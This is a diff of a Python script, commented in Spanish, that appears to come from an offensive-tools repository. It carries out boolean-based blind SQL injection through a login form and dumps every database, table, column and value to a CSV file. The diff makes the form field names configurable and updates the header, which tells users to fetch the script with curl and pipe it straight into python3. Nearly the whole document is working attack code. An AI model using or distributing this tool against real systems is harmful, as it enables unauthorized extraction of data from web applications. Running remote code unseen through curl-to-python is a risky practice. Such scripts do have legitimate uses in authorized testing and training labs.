@@ -9,46 +9,57 @@
 # Script de NiPeGun para usar error-based SQLi para dumpear una base de datos de una URL específica
 #
 # Ejecución remota (puede requerir permisos sudo):
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | python3 -
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/SQLi/LoginForm-DumpearBasesDeDatos-ConBooleanBasedBlind.py | python3 -
 #
 # Ejecución remota como root (para sistemas sin sudo):
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | sed 's-sudo--g' | python3 -
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/SQLi/LoginForm-DumpearBasesDeDatos-ConBooleanBasedBlind.py | sed 's-sudo--g' | python3 -
 #
 # Ejecución remota con parámetros:
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | python3 - Parámetro1 Parámetro2
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/SQLi/LoginForm-DumpearBasesDeDatos-ConBooleanBasedBlind.py | python3 - Parámetro1 Parámetro2
 #
 # Bajar y editar directamente el archivo en nano
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | nano -
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/SQLi/LoginForm-DumpearBasesDeDatos-ConBooleanBasedBlind.py | nano -
 # ----------
 
 # Requisitos: # python3 -m pip install --user x --break-system-packages
+
+#!/usr/bin/env python3
 
 import requests
 import argparse
 import csv
 from urllib.parse import urlparse
 
+# Argumentos
 parser = argparse.ArgumentParser()
 parser.add_argument("--url", required=True, help="URL del login vulnerable (ej: http://10.10.10.10/login)")
 parser.add_argument("--max", type=int, default=10, help="Máximo de elementos por nivel")
 parser.add_argument("--success", default="Bienvenido", help="Texto que indica autenticación exitosa")
+parser.add_argument("--user-field", required=True, help="Nombre del campo de usuario en el formulario")
+parser.add_argument("--pass-field", required=True, help="Nombre del campo de contraseña en el formulario")
 args = parser.parse_args()
 
+# Parámetros
 url = args.url
 max_enum = args.max
 success_indicator = args.success
+user_field = args.user_field
+pass_field = args.pass_field
 
+# Envío del payload SQLi
 def send_payload(condition):
   payload = f"' AND ({condition}) -- -"
-  r = requests.post(url, data={"username": payload, "password": "x"})
+  r = requests.post(url, data={user_field: payload, pass_field: "x"})
   return success_indicator in r.text
 
+# Extracción de un carácter
 def extract_char(query, pos):
   for c in range(32, 127):
     if send_payload(f"ASCII(SUBSTRING(({query}),{pos},1))={c}"):
       return chr(c)
   return None
 
+# Extracción de una cadena completa
 def extract_string(query, max_len=40):
   result = ""
   for pos in range(1, max_len + 1):
@@ -58,13 +69,14 @@ def extract_string(query, max_len=40):
     result += ch
   return result
 
-# CSV
+# Archivo CSV
 host = urlparse(url).hostname.replace(".", "_")
 csv_file = f"dump_{host}.csv"
 csvf = open(csv_file, "w", newline="", encoding="utf-8")
 csvw = csv.writer(csvf)
 csvw.writerow(["Database", "Table", "Column", "RowIndex", "Value"])
 
+# Enumeración de datos
 for db_i in range(max_enum):
   db = extract_string(f"SELECT schema_name FROM information_schema.schemata LIMIT {db_i},1")
   if not db: break
@@ -92,3 +104,4 @@ for db_i in range(max_enum):
 
 csvf.close()
 print(f"\n CSV guardado en {csv_file}")
+
